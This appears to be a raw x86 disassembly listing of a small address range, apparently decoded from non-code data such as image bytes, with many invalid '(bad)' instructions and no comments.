  413865:	bound  ecx,QWORD PTR [esi-0x1]
  413868:	fldenv [eax+edx*2-0x1]
  41386c:	(bad)  [ebp+0x50]
  41386f:	(bad)  
  413870:	fisub  WORD PTR [esi+0x51]
  413873:	(bad)  
  413874:	fbld   TBYTE PTR [edi+0x52]
  413877:	jmp    ecx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	push   edi
  41387b:	jmp    esp
  41387d:	pop    edi
  41387e:	inc    edi
  41387f:	(bad)  
  413880:	fsub   QWORD PTR [ebp+0x50]
  413883:	dec    edi
  413885:	leave  
  413886:	(bad)  
  413887:	call   eax
  413889:	(bad)  
  41388b:	call   FWORD PTR [edi-0x65016262]
  413891:	call   0x0:0x3f9a
	...
  4138a4:	xchg   ebx,eax
  4138a5:	xchg   ebx,eax
  4138a6:	xchg   ebp,eax
  4138a7:	xchg   bh,cl
  4138a9:	enter  0xffc7,0xcc
  4138ad:	(bad)
  4138b0:	mov    dl,0xb1
  4138b2:	scas   al,BYTE PTR es:[edi]
  4138b3:	(bad)  
  4138b4:	mov    ebx,0xc2ffbbba
  4138b9:	ret    0xffc3
  4138bc:	lods   al,BYTE PTR ds:[esi]
  4138bd:	stos   BYTE PTR es:[edi],al
  4138be:	stos   DWORD PTR es:[edi],eax
  4138bf:	jmp    FWORD PTR [edx-0x4f005556]
  4138c5:	mov    al,0xb0
  4138c7:	inc    eax
  4138c9:	rol    ecx,0xff
  4138cc:	mov    al,0xb6
  4138ce:	mov    edx,0x1f2487ff
  4138d3:	call   DWORD PTR [ecx-0x6800ede4]
  4138d9:	cs daa 
  4138db:	call   DWORD PTR [ebx-0x6e00e1da]
  4138e1:	and    ebx,DWORD PTR [ebx]
  4138e3:	dec    DWORD PTR [esi-0x7000e8e1]
  4138e9:	pop    ds
  4138ea:	push   ss
  4138eb:	dec    DWORD PTR [edi-0x7000f7eb]
  4138f1:	or     eax,DWORD PTR [eax]
  4138f3:	call   DWORD PTR [ebp-0x6c00fff2]
  4138f9:	cmp    BYTE PTR [esi],ch
  4138fb:	(bad)  
  4138fc:	mov    ebp,0xd4ffadaf
  413901:	aam    0xd4
  413903:	dec    ecx
  413905:	leave  
  413906:	leave  
  413907:	inc    edx
  413909:	ret    0xffc2
  41390c:	enter  0xc5c5,0xff
  413910:	xchg   BYTE PTR [edi],dh
  413912:	sub    edi,edi
  413914:	shl    DWORD PTR [eax+0x4e],1
  413917:	call   esi
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	pop    ebx
  41391b:	(bad)  
  41391c:	fldcw  WORD PTR [ebx+0x58]
  41391f:	(bad)  
  413920:	fld    TBYTE PTR [ebp+0x5a]
  413923:	(bad)  
  413924:	fisubr WORD PTR [esi+0x5b]
  413927:	jmp    eax
  413929:	jo     0x413988
  41392b:	jmp    ebx
  41392d:	jno    0x41398c
  41392f:	jmp    ebp
  413931:	jae    0x413991
  413933:	jmp    esi
  413935:	je     0x413996
  413937:	jmp    edi
  413939:	js     0x41399e
  41393b:	(bad)  
  41393c:	call   0xe54091af
  413941:	push   0x54
  413943:	call   edx
  413945:	(bad)
  413948:	aad    0xdd
  41394a:	(bad)  
  41394c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41394d:	mov    ds:0x9999ffa2,al
  413952:	cdq    
  413953:	push   0x0
	...
  413964:	xchg   ebx,eax
  413965:	xchg   edx,eax
  413966:	xchg   esi,eax
  413967:	xchg   ah,cl
  413969:	(bad)  
  41396a:	enter  0xc6ff,0xbe
  41396e:	sar    bh,0xa5
  413971:	mov    ds:0xb6b9ffa0,eax
  413976:	mov    bh,0xff
  413978:	mov    ah,0xc7
  41397b:	push   DWORD PTR [ecx-0x4d004f51]
  413981:	mov    bl,0xb2
  413983:	(bad)  
  413984:	mov    ecx,0xc3ffb9b9
  413989:	ret    
  41398a:	ret    
  41398b:	push   DWORD PTR [esi-0x71003b41]
  413991:	ds cmp edi,edi
  413994:	xchg   ecx,eax
  413995:	sbb    edx,DWORD PTR [ecx]
  413997:	call   FWORD PTR [eax+edi*1+0x2f97ff31]
  41399e:	sub    bh,bh
  4139a0:	xchg   ebp,eax
  4139a1:	sub    esp,DWORD PTR ds:0x212994ff
  4139a7:	call   DWORD PTR [esi-0x6e00e2d8]
  4139ad:	adc    BYTE PTR [edi+edi*8],al
  4139b0:	(bad)  
  4139b1:	or     eax,0x3085ff00
  4139b6:	daa    
  4139b7:	dec    edx
  4139b9:	mov    esp,0xececffbb
  4139be:	in     al,dx
  4139bf:	(bad)  
  4139c0:	(bad)  
  4139c2:	aam    0xff
  4139c4:	mov    bh,0x94
  4139c6:	nop
  4139c7:	inc    ebp
  4139c9:	mov    edx,0xdedeffb8
  4139ce:	fdivp  st(7),st
  4139d0:	mov    dl,0xa1
  4139d2:	lahf   
  4139d3:	push   DWORD PTR [edx-0x2200aea0]
  4139d9:	jns    0x413a44
  4139db:	(bad)  
  4139dc:	fbstp  TBYTE PTR [edi+0x66]
  4139df:	jmp    edx
  4139e1:	jns    0x413a4a
  4139e3:	jmp    esi
  4139e5:	jnp    0x413a4f
  4139e7:	jmp    esi
  4139e9:	jl     0x413a54
  4139eb:	(bad)  
  4139ec:	call   0xeb40a46e
  4139f1:	jg     0x413a5e
  4139f3:	(bad)  
  4139f4:	jmp    0x413976
  4139f6:	ins    BYTE PTR es:[edi],dx
  4139f7:	(bad)  
  4139f8:	in     al,dx
  4139f9:	sub    BYTE PTR [ebp-0x1],0xf0
  4139fd:	sub    BYTE PTR [ebx-0x1],0xea
  413a01:	ins    DWORD PTR es:[edi],dx
  413a02:	push   ebp
  413a03:	call   edx
  413a05:	mov    esp,0xdfd5ffb7
  413a0a:	loope  0x413a0b
  413a0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a0f:	call   FWORD PTR [ecx+0x8b9999]
	...
  413a21:	add    BYTE PTR [eax],al
  413a23:	add    BYTE PTR [edx+edx*4-0x3f39796c],dl
  413a2a:	sar    bh,0xbe
  413a2d:	mov    ebx,0x9fa3ffbb
  413a32:	lahf   
  413a33:	push   DWORD PTR [esi-0x36004a4c]
  413a39:	retf   
  413a3a:	leave  
  413a3b:	(bad)  
  413a3c:	mov    ecx,0xb9ffb9bb
  413a41:	mov    ecx,0xbcbcffb9
  413a46:	mov    esp,0xc7c6c6ff
  413a4b:	(bad)  
  413a4c:	mov    ecx,0x99ffc7c3
  413a51:	push   esi
  413a52:	push   edx
  413a53:	call   DWORD PTR [ecx-0x5c00eee6]
  413a59:	inc    esp
  413a5a:	cmp    eax,0x32379cff
  413a5f:	call   FWORD PTR [edx-0x6200d0ca]
  413a65:	cmp    BYTE PTR [edi],ch
  413a67:	call   FWORD PTR [ebx-0x7500e5da]
  413a6d:	push   cs
  413a6e:	add    edi,edi
  413a70:	cmp    DWORD PTR ds:0xd4daff36,0xffffffd3
  413a7a:	(bad)  
  413a7b:	(bad)  
  413a7c:	out    dx,al
  413a7d:	out    dx,al
  413a7e:	out    dx,al
  413a7f:	call   FWORD PTR [edi-0x5300a69e]
  413a85:	and    BYTE PTR [edi+edi*8],cl
  413a88:	mov    bl,0x77
  413a8a:	outs   dx,BYTE PTR ds:[esi]
  413a8b:	jmp    eax
  413a8d:	loopne 0x413a6f
  413a8f:	(bad)  
  413a90:	out    dx,al
  413a91:	out    dx,al
  413a92:	out    dx,al
  413a93:	jmp    DWORD PTR [eax-0x28008581]
  413a99:	jg     0x413b0b
  413a9b:	jmp    ebp
  413a9d:	test   BYTE PTR [ebx-0x1],dh
  413aa0:	jmp    0xeb40b02b
  413aa5:	xchg   DWORD PTR [ebp-0x1],esi
  413aa8:	in     al,dx
  413aa9:	mov    DWORD PTR [edi-0x1],esi
  413aac:	out    dx,al
  413aad:	mov    bh,BYTE PTR [eax-0x1]
  413ab0:	lock mov edi,DWORD PTR [ecx-0x1]
  413ab4:	icebp  
  413ab5:	lea    edi,[edx-0x1]
  413ab8:	repnz (bad) 
  413aba:	jl     0x413abb
  413abc:	not    BYTE PTR [ecx+0x74f3ff7d]
  413ac2:	pop    ebp
  413ac3:	(bad)  
  413ac4:	fdiv   DWORD PTR [edx-0x1d2a0056]
  413aca:	in     al,0xff
  413acc:	test   eax,0x96ffaaaa
  413ad1:	xchg   esi,eax
  413ad2:	xchg   esi,eax
  413ad3:	mov    bl,0x0
	...
  413ae1:	add    BYTE PTR [eax],al
  413ae3:	add    BYTE PTR [edx-0x43796a6d],dl
  413ae9:	mov    eax,0xb2bbffba
  413aee:	mov    ah,0xff
  413af0:	mov    eax,ds:0xb4ff9a99
  413af5:	mov    dl,0xb4
  413af7:	dec    esp
  413af9:	int    0xcf
  413afb:	(bad)  
  413afc:	mov    esi,0xbdffbec0
  413b01:	mov    ebp,0xbfbfffbd
  413b06:	mov    edi,0xc6c6c6ff
  413b0b:	(bad)  
  413b0c:	mov    edx,0x97ffc7c4
  413b11:	call   WORD PTR gs:[ecx-0x5700ede6]
  413b19:	push   eax
  413b1a:	dec    eax
  413b1b:	jmp    DWORD PTR [ecx-0x5e00c2be]
  413b21:	inc    edx
  413b22:	cmp    edi,edi
  413b24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b25:	inc    edx
  413b26:	cmp    bh,bh
  413b28:	xchg   ebp,eax
  413b29:	pop    ss
  413b2a:	or     bh,bh
  413b2c:	(bad)  
  413b2d:	and    bl,BYTE PTR [edx]
  413b2f:	dec    ecx
  413b31:	mov    eax,0xffffffb6
  413b36:	(bad)  
  413b37:	(bad)  
  413b38:	jmp    0xaa412224
  413b3d:	push   0x61
  413b3f:	jmp    FWORD PTR [ecx-0x4600fae6]
  413b45:	sbb    BYTE PTR [eax],al
  413b47:	push   DWORD PTR [eax-0x2e00e4d2]
  413b4d:	mov    edi,0xf2f2ffbd
  413b52:	bnd jmp edx
  413b55:	loope  0x413b38
  413b57:	jmp    FWORD PTR [eax-0x1400968e]
  413b5d:	xchg   edx,eax
  413b5e:	cmp    edi,0xff8393ee
  413b64:	out    dx,eax
  413b65:	xchg   ebp,eax
  413b66:	test   bh,bh
  413b68:	icebp  
  413b69:	xchg   esi,eax
  413b6a:	test   edi,edi
  413b6c:	repz xchg edi,eax
  413b6e:	xchg   bh,bh
  413b70:	cmc    
  413b71:	cwde   
  413b72:	xchg   edi,edi
  413b74:	cmc    
  413b75:	cdq    
  413b76:	mov    bh,bh
  413b78:	neg    BYTE PTR [edx-0x5f060077]
  413b7e:	mov    ?,edi
  413b80:	stc    
  413b81:	sub    BYTE PTR [edx-0x1],0xdb
  413b85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b86:	call   0xb5ff:0xe4e2d8ff
  413b8d:	mov    ch,0xb5
  413b8f:	call   DWORD PTR [edi+0xc99797]
	...
  413ba1:	add    BYTE PTR [eax],al
  413ba3:	add    BYTE PTR [ebx-0x43796a6e],dl
  413ba9:	scas   al,BYTE PTR es:[edi]
  413baa:	mov    ah,0xff
  413bac:	ret    
  413bad:	stos   BYTE PTR es:[edi],al
  413bae:	mov    dl,0xff
  413bb0:	test   eax,0xb3ffa09c
  413bb5:	mov    cl,0xb6
  413bb7:	dec    ebp
  413bb9:	iret   
  413bba:	iret   
  413bbb:	inc    ebx
  413bbd:	(bad)  
  413bc1:	ret    0xffc2
  413bc4:	(bad)  
  413bc5:	(bad)  
  413bc6:	(bad)  
  413bc7:	inc    esi
  413bc9:	mov    dh,0xff
  413bcc:	mov    esi,0x9cffc8c6
  413bd1:	jg     0x413b53
  413bd3:	dec    DWORD PTR [edi-0x5200e8e2]
  413bd9:	pop    eax
  413bda:	push   ecx
  413bdb:	jmp    DWORD PTR [ebp-0x5400b8b4]
  413be1:	push   ecx
  413be2:	dec    ecx
  413be3:	jmp    DWORD PTR [esi-0x6d00cdc4]
  413be9:	or     eax,DWORD PTR [eax]
  413beb:	call   DWORD PTR [edi-0x6600fbee]
  413bf1:	inc    ecx
  413bf2:	push   DWORD PTR ss:[esi-0x62007f79]
  413bf9:	inc    ebx
  413bfa:	jmp    FWORD PTR ss:[esi-0x4800fae6]
  413c01:	sbb    BYTE PTR [eax],al
  413c03:	(bad)  
  413c04:	mov    esi,0xc4ff001b
  413c09:	sbb    al,BYTE PTR [eax]
  413c0b:	push   DWORD PTR [ecx-0x1700aea4]
  413c11:	call   0xfe3f3bfe
  413c16:	std    
  413c17:	(bad)  
  413c18:	mov    esi,0xcdffb0b2
  413c1d:	mov    BYTE PTR [ebx-0x1],bh
  413c20:	icebp  
  413c21:	sahf   
  413c22:	mov    ?,edi
  413c24:	repz mov al,ds:0xa1f5ff90
  413c2a:	nop
  413c2b:	push   edi
  413c2d:	mov    ds:0xa3f8ff91,al
  413c32:	xchg   edx,eax
  413c33:	(bad)  
  413c34:	stc    
  413c35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c36:	xchg   ebx,eax
  413c37:	(bad)  
  413c38:	cli    
  413c39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c3a:	xchg   esp,eax
  413c3b:	(bad)  
  413c3c:	sti    
  413c3d:	stos   DWORD PTR es:[edi],eax
  413c3e:	fwait
  413c3f:	(bad)  
  413c40:	dec    DWORD PTR [edi-0x621c0087]
  413c46:	(bad)  
  413c47:	(bad)  
  413c48:	fcomp  st(7)
  413c4a:	loop   0x413c4b
  413c4c:	mov    esi,0x96ffc0c0
  413c51:	xchg   esi,eax
  413c52:	xchg   esi,eax
  413c53:	aad    0x0
	...
  413c61:	add    BYTE PTR [eax],al
  413c63:	add    BYTE PTR [esp+ecx*4-0x566a796a],bl
  413c6a:	popf   
  413c6b:	jmp    DWORD PTR [ecx-0x25]
  413c6e:	pushf  
  413c6f:	call   DWORD PTR [ecx-0x3c005845]
  413c75:	lods   al,BYTE PTR ds:[esi]
  413c76:	mov    eax,0xd1d1d0ff
  413c7b:	inc    edi
  413c7d:	mov    edi,0xc6c6c6ff
  413c83:	inc    edi
  413c85:	mov    edi,0xc9c9c9ff
  413c8b:	inc    edx
  413c8d:	(bad)  
  413c8e:	retf   0xa9ff
  413c91:	call   0xff1d:0x268dff9a
  413c98:	scas   eax,DWORD PTR es:[edi]
  413c99:	pop    ebx
  413c9a:	push   ebp
  413c9b:	jmp    FWORD PTR [ecx+ebx*2+0x5db2ff51]
  413ca2:	push   esp
  413ca3:	call   FWORD PTR [ebp-0x6c00e4d7]
  413ca9:	or     DWORD PTR [eax],eax
  413cab:	call   FWORD PTR [ebp-0x5a00ffef]
  413cb1:	adc    eax,DWORD PTR [eax]
  413cb3:	jmp    FWORD PTR [ecx-0x5100f9e6]
  413cb9:	push   ss
  413cba:	add    bh,bh
  413cbc:	mov    ch,0x18
  413cbe:	add    bh,bh
  413cc0:	mov    ebx,0xc3ff0019
  413cc5:	sbb    eax,DWORD PTR [eax]
  413cc7:	inc    edi
  413cc9:	sbb    BYTE PTR [eax],al
  413ccb:	inc    edx
  413ccd:	and    ecx,DWORD PTR [ecx]
  413ccf:	dec    edx
  413cd1:	scas   eax,DWORD PTR es:[edi]
  413cd2:	stos   BYTE PTR es:[edi],al
  413cd3:	push   edx
  413cd5:	repnz repnz (bad) 
  413cd8:	sti    
  413cd9:	sti    
  413cda:	sti    
  413cdb:	jmp    FWORD PTR [ecx-0x12007773]
  413ce1:	mov    ds:0xa9f7ff95,al
  413ce6:	call   0xf9ff:0x9babf9ff
  413ced:	lods   al,BYTE PTR ds:[esi]
  413cee:	pushf  
  413cef:	(bad)  
  413cf0:	sti    
  413cf1:	lods   eax,DWORD PTR ds:[esi]
  413cf2:	sahf   
  413cf3:	(bad)  
  413cf4:	cld    
  413cf5:	scas   al,BYTE PTR es:[edi]
  413cf6:	sahf   
  413cf7:	(bad)  
  413cf8:	std    
  413cf9:	scas   al,BYTE PTR es:[edi]
  413cfa:	lahf   
  413cfb:	(bad)  
  413cfc:	(bad)  
  413cfd:	mov    ch,0xa5
  413cff:	(bad)  
  413d00:	call   FWORD PTR [ebp-0x60120077]
  413d06:	nop
  413d07:	(bad)  
  413d08:	fchs   
  413d0a:	loopne 0x413d0b
  413d0c:	ret    
  413d0d:	mov    bh,0xff
  413d10:	xchg   esi,eax
  413d11:	xchg   ebp,eax
  413d12:	xchg   ebp,eax
  413d13:	in     al,0x0
	...
  413d21:	add    BYTE PTR [eax],al
  413d23:	add    BYTE PTR [edi+0x347d9a8b],bl
  413d29:	int    0x7e
  413d2b:	inc    DWORD PTR [eax]
  413d2d:	jmp    FWORD PTR [ebx-0x1]
  413d30:	je     0x413ce9
  413d32:	fwait
  413d33:	dec    edx
  413d35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d36:	mov    edx,0xd3d3d3ff
  413d3b:	dec    ebx
  413d3d:	retf   
  413d3e:	retf   
  413d3f:	dec    ecx
  413d41:	leave  
  413d42:	leave  
  413d43:	dec    ebx
  413d45:	retf   
  413d46:	retf   
  413d47:	dec    ebx
  413d49:	retf   
  413d4a:	retf   
  413d4b:	dec    edx
  413d4d:	int    0xcf
  413d4f:	push   DWORD PTR [edx-0x6e005052]
  413d55:	xor    BYTE PTR [edx],ch
  413d57:	push   DWORD PTR [ecx-0x4b00aaa6]
  413d5d:	addr16 pop edi
  413d5f:	push   DWORD PTR [ebp-0x6800a9a1]
  413d65:	push   ss
  413d66:	or     bh,bh
  413d68:	cwde   
  413d69:	or     al,BYTE PTR [eax]
  413d6b:	jmp    DWORD PTR [ecx-0x5800ffee]
  413d71:	adc    al,0x0
  413d73:	jmp    FWORD PTR [ebp+edx*1+0x16b2ff00]
  413d7a:	add    bh,bh
  413d7c:	mov    bh,0x18
  413d7e:	add    bh,bh
  413d80:	mov    esi,0xc4ff001a
  413d85:	sbb    al,0x0
  413d87:	dec    ecx
  413d89:	pop    ss
  413d8a:	add    bh,bh
  413d8c:	shl    BYTE PTR [edi],cl
  413d8e:	or     bh,bh
  413d90:	ret    0x7481
  413d93:	(bad)  
  413d94:	fcom   st(3)
  413d96:	sar    edi,cl
  413d98:	cmc    
  413d99:	cmc    
  413d9a:	cmc    
  413d9b:	(bad)  
  413d9c:	in     al,dx
  413d9d:	jmp    0x413d8a
  413d9f:	jmp    FWORD PTR [ebp-0x600837d]
  413da5:	mov    bl,0xa5
  413da7:	(bad)  
  413da8:	sti    
  413da9:	mov    ah,0xa5
  413dab:	(bad)  
  413dac:	cld    
  413dad:	mov    dh,0xa7
  413daf:	(bad)  
  413db0:	(bad)  
  413db1:	mov    bh,0xa7
  413db3:	(bad)  
  413db4:	(bad)  
  413db5:	mov    eax,0xb7ffffa8
  413dba:	test   eax,0xafbdffff
  413dbf:	(bad)  
  413dc0:	jmp    FWORD PTR [ebp-0x5e110066]
  413dc6:	(bad)  
  413dc7:	(bad)  
  413dc8:	fcmovnu st,st(6)
  413dca:	fdivp  st(7),st
  413dcc:	enter  0xcdcb,0xff
  413dd0:	xchg   ebp,eax
  413dd1:	xchg   ebp,eax
  413dd2:	xchg   ebp,eax
  413dd3:	lock fwait
  413dd5:	fwait
  413dd6:	fwait
  413dd7:	and    BYTE PTR [eax],al
	...
  413de1:	add    BYTE PTR [eax],al
  413de3:	add    BYTE PTR [edx+0x3e6e9f9a],bl
  413de9:	xchg   esp,eax
  413dea:	inc    DWORD PTR ds:0x1b54
  413def:	(bad)  
  413df0:	jge    0x413e64
  413df2:	je     0x413df3
  413df4:	ret    
  413df5:	mov    edx,0xd8d5ffc3
  413dfa:	fcos   
  413dfc:	iret   
  413dfd:	iret   
  413dfe:	iret   
  413dff:	dec    esp
  413e01:	int3   
  413e02:	int3   
  413e03:	dec    ebp
  413e05:	int    0xcd
  413e07:	dec    esi
  413e09:	into   
  413e0a:	into   
  413e0b:	call   eax
  413e0d:	rcl    esp,cl
  413e0f:	(bad)  
  413e10:	mov    esp,0x96ffbbb8
  413e15:	cmp    dh,BYTE PTR [edi+edi*8]
  413e18:	mov    cl,0x5c
  413e1a:	push   ebp
  413e1b:	(bad)  
  413e1c:	mov    esi,0xacff727a
  413e21:	dec    esp
  413e22:	inc    edx
  413e23:	call   DWORD PTR [ebp-0x6100fff7]
  413e29:	(bad)  
  413e2b:	jmp    DWORD PTR [ebp-0x5600ffed]
  413e31:	adc    al,0x0
  413e33:	push   DWORD PTR [eax-0x4700ffea]
  413e39:	sbb    DWORD PTR [eax],eax
  413e3b:	inc    ebx
  413e3d:	sbb    eax,DWORD PTR [eax]
  413e3f:	dec    ebx
  413e41:	push   ds
  413e42:	add    bh,bh
  413e44:	rcr    DWORD PTR [edi],cl
  413e46:	add    bh,bh
  413e48:	ficom  DWORD PTR [edi]
  413e4a:	add    bh,bh
  413e4c:	out    0x3d,al
  413e4e:	sbb    eax,0x99aaf7ff
  413e53:	(bad)  
  413e54:	mov    edi,0xd7ff9ba2
  413e59:	xlat   BYTE PTR ds:[ebx]
  413e5a:	xlat   BYTE PTR ds:[ebx]
  413e5b:	(bad)  
  413e5c:	out    dx,eax
  413e5d:	out    dx,eax
  413e5e:	out    dx,eax
  413e5f:	inc    esi
  413e61:	mov    edi,0x9dcdffbd
  413e66:	xchg   ecx,eax
  413e67:	(bad)  
  413e68:	inc    edx
  413e6a:	mov    cl,0xff
  413e6c:	inc    ebx
  413e6e:	mov    bl,0xff
  413e70:	inc    ebp
  413e72:	mov    bl,0xff
  413e74:	inc    esi
  413e76:	mov    ah,0xff
  413e78:	inc    edi
  413e7a:	mov    ch,0xff
  413e7c:	dec    edx
  413e7e:	mov    ecx,0xadc2ffff
  413e83:	push   ecx
  413e85:	test   eax,0xdadeff8f
  413e8a:	fcos   
  413e8c:	int    0xd1
  413e8e:	sar    edi,cl
  413e90:	xchg   esi,eax
  413e91:	xchg   esi,eax
  413e92:	xchg   esi,eax
  413e93:	cld    
  413e94:	fwait
  413e95:	fwait
  413e96:	fwait
  413e97:	dec    edx
	...
  413ea4:	cdq    
  413ea5:	xchg   edi,eax
  413ea6:	pushf  
  413ea7:	outs   dx,BYTE PTR ds:[esi]
  413ea8:	arpl   WORD PTR [ebp+edx*2-0x1],ax
  413eac:	daa    
  413ead:	add    BYTE PTR [edx],al
  413eaf:	(bad)  
  413eb0:	jl     0x413f1f
  413eb2:	ins    BYTE PTR es:[edi],dx
  413eb3:	(bad)  
  413eb4:	mov    ebp,0xd5ffc1c0
  413eb9:	(bad)  
  413eba:	xlat   BYTE PTR ds:[ebx]
  413ebb:	call   eax
  413ebd:	rcl    al,1
  413ebf:	dec    edi
  413ec1:	iret   
  413ec2:	iret   
  413ec3:	call   ecx
  413ec5:	rcl    ecx,1
  413ec7:	call   edx
  413ec9:	rcl    dl,cl
  413ecb:	call   esi
  413ecd:	xlat   BYTE PTR ds:[ebx]
  413ece:	fdivr  st,st(7)
  413ed0:	mov    ebx,0x95ffbcbb
  413ed5:	cmp    al,0x34
  413ed7:	push   DWORD PTR [edi+ebx*2-0x7f3b00a7]
  413ede:	jp     0x413edf
  413ee0:	lahf   
  413ee1:	sub    bl,BYTE PTR ds:0x799ff
  413ee7:	jmp    DWORD PTR [esi-0x5100ffee]
  413eed:	adc    eax,0x18b6ff00
  413ef2:	add    bh,bh
  413ef4:	ret    0x1b
  413ef7:	dec    edx
  413ef9:	push   ds
  413efa:	add    bh,bh
  413efc:	shl    BYTE PTR [eax],cl
  413efe:	add    bh,bh
  413f00:	(bad)  [edx]
  413f02:	add    bh,bh
  413f04:	loop   0x413f28
  413f06:	add    bh,bh
  413f08:	call   0xf5403f28
  413f0d:	pop    ecx
  413f0e:	aaa    
  413f0f:	(bad)  
  413f10:	std    
  413f11:	mov    edi,0xc4f5ffb3
  413f16:	mov    ecx,0xaaaec1ff
  413f1b:	dec    edi
  413f1d:	iret   
  413f1e:	iret   
  413f1f:	jmp    eax
  413f21:	loopne 0x413f03
  413f23:	jmp    FWORD PTR [ecx-0x17006663]
  413f29:	mov    edx,0xccffffab
  413f2e:	mov    esp,0xbdceffff
  413f33:	(bad)  
  413f34:	dec    edi
  413f36:	mov    esi,0xbed0ffff
  413f3b:	(bad)  
  413f3c:	call   esp
  413f3e:	ret    0xffff
  413f41:	sar    DWORD PTR [edi+edi*8-0x70520a],1
  413f48:	(bad)  
  413f4a:	sar    edi,1
  413f4c:	rcl    edi,cl
  413f4e:	fcos   
  413f50:	cwde   
  413f51:	xchg   edi,eax
  413f52:	xchg   edi,eax
  413f53:	call   FWORD PTR [edx+0x719a9a]
	...
  413f61:	add    BYTE PTR [eax],al
  413f63:	add    BYTE PTR [esi+0x6879a19d],bl
  413f69:	fs call DWORD PTR gs:[ebx+ecx*2+0x43]
  413f6f:	inc    DWORD PTR [edi-0x52008080]
  413f75:	scas   al,BYTE PTR es:[edi]
  413f76:	mov    cl,0xff
  413f78:	loope  0x413f5b
  413f7a:	loop   0x413f7b
  413f7c:	iret   
  413f7d:	iret   
  413f7e:	iret   
  413f7f:	dec    eax
  413f81:	enter  0xffc8,0xce
  413f85:	into   
  413f86:	into   
  413f87:	call   edx
  413f89:	rcl    dl,cl
  413f8b:	(bad)  
  413f8c:	fcmovnu st,st(3)
  413f8e:	(bad)  
  413f90:	mov    ebx,0x8fffc1c0
  413f95:	ds cmp edi,edi
  413f98:	mov    ecx,0xbfff5d65
  413f9d:	jb     0x414008
  413f9f:	call   FWORD PTR [eax+edx*1+0xfa5ff04]
  413fa6:	add    bh,bh
  413fa8:	lods   eax,DWORD PTR ds:[esi]
  413fa9:	adc    eax,0x17b5ff00
  413fae:	add    bh,bh
  413fb0:	mov    esi,0xc6ff001a
  413fb5:	sbb    al,0x0
  413fb7:	dec    ebp
  413fb9:	push   ds
  413fba:	add    bh,bh
  413fbc:	aam    0x21
  413fbe:	add    bh,bh
  413fc0:	(bad)  [ebx]
  413fc2:	add    bh,bh
  413fc4:	jecxz  0x413fe8
  413fc6:	add    bh,bh
  413fc8:	jmp    0x413fe9
  413fca:	add    bh,bh
  413fcc:	div    BYTE PTR [edx+0x56]
  413fcf:	(bad)  
  413fd0:	dec    dh
  413fd2:	(bad)  
  413fd3:	(bad)  
  413fd4:	dec    esi
  413fd6:	(bad)  
  413fd9:	shl    DWORD PTR [edi-0x4f4d4401],0xff
  413fe0:	leave  
  413fe1:	leave  
  413fe2:	leave  
  413fe3:	(bad)  
  413fe4:	fcomp  st(0)
  413fe6:	fdivr  st,st(7)
  413fe8:	mov    al,ds:0xf5ff8a90
  413fed:	int3   
  413fee:	mov    ebp,0xc5d5ffff
  413ff3:	(bad)  
  413ff4:	call   esi
  413ff6:	(bad)  
  413ff9:	(bad)  
  413ffa:	(bad)  
  413ffb:	(bad)  
  413ffc:	(bad)  
  413ffd:	fmul   st,st(1)
  413fff:	(bad)  
  414000:	(bad)  
  414001:	fcmove st,st(2)
  414003:	(bad)  
  414004:	sti    
  414005:	mov    bl,0x95
  414007:	(bad)  
  414008:	(bad)  
  41400a:	(bad)  
  41400b:	(bad)  
  41400c:	fsubr  st(0),st
  41400e:	loop   0x41400f
  414010:	call   0x9999:0x99ff9b9b
  414017:	mov    eax,DWORD PTR [eax]
	...
  414021:	add    BYTE PTR [eax],al
  414023:	add    BYTE PTR [ebp-0x6fc55a5e],ah
  414029:	xchg   ecx,eax
  41402a:	(bad)  
  41402b:	call   DWORD PTR [edx-0x61006e6c]
  414031:	cdq    
  414032:	pushf  
  414033:	(bad)  
  414034:	fcmovu st,st(0)
  414036:	(bad)  
  414038:	(bad)  
  414039:	(bad)  
  41403a:	(bad)  
  41403b:	(bad)  
  41403c:	clc    
  41403d:	clc    
  41403e:	clc    
  41403f:	jmp    ebp
  414041:	in     eax,0xe5
  414043:	(bad)  
  414044:	(bad)  
  414046:	fcos   
  414048:	rcl    ebx,cl
  41404a:	sar    edi,cl
  41404c:	rcl    ebx,cl
  41404e:	sar    edi,cl
  414050:	ror    al,0xc9
  414053:	call   DWORD PTR [ecx-0x4400b5b1]
  414059:	pusha  
  41405a:	push   edi
  41405b:	push   DWORD PTR [ecx+edx*2+0x69cff44]
  414062:	add    bh,bh
  414064:	test   al,0x13
  414066:	add    bh,bh
  414068:	scas   eax,DWORD PTR es:[edi]
  414069:	adc    eax,0x18b8ff00
  41406e:	add    bh,bh
  414070:	rcr    BYTE PTR [ebx],0x0
  414073:	inc    edi
  414075:	sbb    eax,0x20d0ff00
  41407a:	add    bh,bh
  41407c:	xlat   BYTE PTR ds:[ebx]
  41407d:	and    DWORD PTR [eax],eax
  41407f:	(bad)  
  414080:	fisub  WORD PTR [ebx]
  414082:	add    bh,bh
  414084:	call   0xf04040a7
  414089:	daa    
  41408a:	add    edi,edi
  41408c:	cli    
  41408d:	xchg   ecx,eax
  41408e:	jnp    0x41408f
  414090:	(bad)  
  414091:	fcmovnbe st,st(4)
  414093:	(bad)  
  414094:	call   ebp
  414096:	retf   
  414097:	(bad)  
  414098:	call   esp
  41409a:	leave  
  41409b:	call   esi
  41409d:	mov    bh,0xae
  41409f:	push   DWORD PTR [edi-0x39004c4c]
  4140a5:	mov    dh,0xff
  4140a8:	retf   
  4140a9:	retf   
  4140aa:	retf   
  4140ab:	jmp    DWORD PTR [esi-0x600726c]
  4140b1:	(bad)  
  4140b2:	(bad)  
  4140b3:	(bad)  
  4140b4:	(bad)  
  4140b5:	fmul   st(5),st
  4140b7:	(bad)  
  4140b8:	(bad)  
  4140b9:	fmul   st(6),st
  4140bb:	(bad)  
  4140bc:	(bad)  
  4140bd:	(bad)  
  4140bf:	(bad)  
  4140c0:	jmp    esp
  4140c2:	xlat   BYTE PTR ds:[ebx]
  4140c3:	(bad)  
  4140c4:	(bad)  
  4140c5:	mov    esi,0xc6e0ffa2
